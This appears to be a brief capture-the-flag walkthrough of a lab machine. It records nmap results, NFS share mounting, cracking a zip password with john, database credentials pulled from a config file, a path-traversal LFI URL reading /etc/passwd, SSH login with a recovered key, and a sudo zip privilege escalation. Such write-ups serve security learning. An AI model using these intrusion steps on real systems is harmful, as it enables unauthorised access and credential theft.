
# nmap
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-21 10:24 EDT
Nmap scan report for 10.0.2.8
Host is up (0.00036s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      51657/tcp   mountd
|   100005  1,2,3      57867/tcp6  mountd
|   100005  1,2,3      59637/udp6  mountd
|   100005  1,2,3      60390/udp   mountd
|   100021  1,3,4      35563/tcp   nlockmgr
|   100021  1,3,4      36261/tcp6  nlockmgr
|   100021  1,3,4      45558/udp   nlockmgr
|   100021  1,3,4      50316/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
|_http-server-header: Apache/2.4.38 (Debian)
35563/tcp open  nlockmgr 1-4 (RPC #100021)
37623/tcp open  mountd   1-3 (RPC #100005)
38951/tcp open  mountd   1-3 (RPC #100005)
51657/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Apache httpd 2.4.48 on port 8080 and port 80

port 80 displays a installation error message due to misconfiguration

8080 shows:
PHP Version 7.3.27-1~deb10u1

`showmount -e 10.0.2.8`
`sudo mount -t nfs 10.0.2.8:/srv/nfs /mnt/dev `

found save.zip in the mount 
password cracked with john
java101

id_rsa key in the zip.

/app/config/config.yaml:


```
    databasename: bolt
    username: bolt
    password: I_love_java
```

LFI vulnerability in website 
http://10.0.2.8:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd

we have a user 
`jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash`

we can login using the key found earlier.
the pass_phrase is the same as the one in conig,
I_love_java

can run zip as sudo, 
easy root.
